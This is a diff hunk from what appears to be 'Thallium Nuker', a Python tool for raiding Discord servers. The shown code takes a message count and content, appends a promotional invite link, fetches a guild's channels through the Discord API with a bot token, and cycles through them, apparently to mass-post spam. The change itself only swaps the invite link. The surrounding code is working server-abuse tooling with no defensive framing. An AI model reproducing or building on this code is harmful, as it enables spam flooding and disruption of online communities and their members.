@@ -398,7 +398,7 @@ class Thallium:
             self.messages.clear(); self.channels.clear()
             amount = int(input("{}({}Thallium{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
             Aizer1 = (input("{}({}Thallium{}) Contant{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
-            Aizer = Aizer1 + ('\n **Thallium Nuker Runs Cord ** https://discord.gg/ntontontop')
+            Aizer = Aizer1 + ('\n **Thallium Nuker Runs Cord ** https://discord.gg/ntontop')
             channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
             for channel in channels: self.channels.append(channel['id'])
             channelz = cycle(self.channels)
